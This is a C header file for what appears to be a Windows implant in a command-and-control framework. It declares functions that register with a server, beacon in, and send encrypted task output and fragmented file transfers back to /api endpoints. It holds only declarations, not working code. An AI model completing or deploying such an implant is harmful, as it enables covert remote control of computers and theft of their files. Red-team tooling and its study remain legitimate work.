#pragma once
#include <windows.h>
#include <winhttp.h>
#include <stdint.h>
#include "protocol.h"

/* http_request: HTTP POST (or GET) to SERVER_HOST:SERVER_PORT.
   method: "GET" or "POST".
   body/body_len: request body (NULL/0 for GET).
   resp_buf: caller-allocated response buffer.
   Returns bytes written into resp_buf, or -1 on any error. */
int http_request(const char *method, const char *path,
                 const uint8_t *body, DWORD body_len,
                 uint8_t *resp_buf, DWORD resp_buf_size);

/* do_register: serializes meta, RSA-OAEP-SHA256 encrypts with pubkey_pem,
   POSTs to /api/register.
   Returns 0 on HTTP 200, -1 on error. */
int do_register(const char *pubkey_pem, const implant_metadata_t *meta);

/* do_checkin: POSTs beacon_id (4 bytes LE) to /api/checkin.
   Writes raw encrypted response into out_buf; sets *out_len.
   *out_len must be initialized to the size of out_buf before calling.
   Returns 0 on success, -1 on error. */
int do_checkin(uint32_t beacon_id, uint8_t *out_buf, DWORD *out_len);

/* send_result: builds TaskHeader(16)+RunRep, aes_encrypt, POSTs to /api/result.
   Returns 0 on success, -1 on error. */
int send_result(uint32_t beacon_id, uint32_t label, uint16_t flags,
                const char *output, const uint8_t session_key[32]);

/* send_result_raw: like send_result but sends arbitrary binary data with
   explicit type, flags, and identifier. Used for fragmented file transfers.
   data may be NULL if data_len is 0.
   Returns 0 on success, -1 on error. */
int send_result_raw(uint32_t beacon_id, uint32_t label, uint8_t type,
                    uint16_t flags, uint32_t identifier,
                    const uint8_t *data, uint32_t data_len,
                    const uint8_t session_key[32]);
